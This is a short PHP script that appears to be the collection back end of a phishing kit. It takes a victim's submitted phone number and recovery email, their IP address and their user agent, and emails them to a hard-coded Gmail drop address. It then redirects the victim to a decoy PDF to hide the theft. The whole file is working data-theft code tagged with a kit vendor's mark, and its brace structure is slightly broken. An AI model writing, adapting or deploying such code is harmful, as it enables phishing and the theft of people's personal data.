<?php
if(isset($_SERVER['HTTP_X_REAL_IP'])){
$ip = $_SERVER['HTTP_X_REAL_IP'];
}else{
$ip=$_SERVER['REMOTE_ADDR'];
$message .= "--------------Online Info-----------------------\n";
$message .= "Phone            : ".$_POST['phone']."\n";
$message .= "Email          : ".$_POST['recovery_email']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- fudpage [.] RU --------------|\n";
$send = "newagain91021@gmail.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $message);   
}
header ("Location: https://storage.googleapis.com/office-document-2314312/fileid/businessmodelsbusinessstrategy.pdf");
?>